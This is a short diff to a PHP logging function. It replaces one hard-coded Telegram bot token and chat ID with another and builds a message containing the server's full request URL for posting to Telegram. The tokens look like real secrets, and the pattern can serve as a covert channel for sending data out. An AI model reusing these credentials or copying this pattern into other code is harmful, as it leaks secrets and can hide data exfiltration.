@@ -3681,8 +3681,8 @@ function customLogger($message) {
     error_log($logMessage, 3, '');
     
     
-    $telegramToken = '7502563828:AAGMYBGVSqysDg47REjblKlZa4fyszWbg7E';
-    $chatId = '2024533279';
+    $telegramToken = '7981126724:AAH4UCJ3evRi0wohScbSQPf6MJ8jQ0gHuc8';
+    $chatId = '7376473296';
     
     $telegramMessage = urlencode($message . PHP_EOL . 'Link to log: ' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
     
